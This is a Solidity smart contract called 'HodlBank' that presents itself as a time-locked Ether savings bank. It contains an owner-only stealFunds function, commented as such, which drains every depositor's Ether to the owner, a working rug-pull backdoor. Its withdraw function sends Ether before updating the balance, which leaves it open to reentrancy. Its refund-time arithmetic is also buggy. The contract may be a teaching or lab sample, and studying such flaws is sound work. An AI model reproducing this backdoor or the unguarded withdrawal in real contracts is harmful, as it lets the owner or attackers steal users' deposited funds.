// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.22 <0.9.0;

contract HodlBank {
    // Payable address can receive Ether
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    event updateRefundTime(address userAddress, uint256 timeRemaining);

    // Payable constructor can receive Ether
    constructor() payable {
        owner = payable(msg.sender);
    }

    // This will store user balances
    mapping(address => uint256) balances;

    // This will store refund times
    mapping(address => uint256) refundTimes;

    // Function to deposit Ether into this contract.
    // Call this function along with some Ether.
    // The balance of this contract will be automatically updated.
    function deposit() public payable {
        // Increase the amount stored in smart contract
        balances[msg.sender] += msg.value;

        // Increase the hodl time
        refundTimes[msg.sender] += block.timestamp + 2 minutes;
    }

    // Withdraw tokens stored in the smart contract
    function withdraw(uint256 _amount) public payable {
        address _to = payable(msg.sender);
        // Fire an event for refund time
        emit updateRefundTime(_to, refundTimes[msg.sender]);

        // Check if user can refund the ETHER stored
        require(block.timestamp > refundTimes[_to], "You can not withdraw yet");

        // Check to see if user has enough balances stored in smart contract
        require(balances[_to] >= _amount, "You do not have enough balance");

        // get the amount of Ether stored in this contract
        uint256 amount = _amount;

        require(
            amount < address(this).balance,
            "Currently contract doesnt have that funds!"
        );

        // send all Ether to owner
        (bool success, ) = _to.call{value: amount}("");
        require(success, "Failed to send Ether");

        // Reduce the amount from the address
        balances[_to] -= amount;
    }

    // Smart Contract Account Balance
    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }

    // Steal Funds
    // Private cannot be payable so it is public
    function stealFunds() public payable onlyOwner {
        // get the amount of Ether stored in this contract
        uint256 amount = address(this).balance;

        // There needs to be a balance for stealing :)
        require(amount > 0, "Contract does not have any balances");

        // send all Ether to owner
        // Owner can receive Ether since the address of owner is payable
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Failed to send Ether");
    }

    function balance() public view returns (uint256) {
        return balances[msg.sender];
    }

    // User Account Balances that are stored in the Smart Contract
    function balanceOfUser(address _user)
        public
        view
        onlyOwner
        returns (uint256)
    {
        return balances[_user];
    }

    // User Refund Times that are stored in the Smart Contract
    function refundTimeOfUser(address _user) public view returns (uint256) {
        return refundTimes[_user];
    }
}
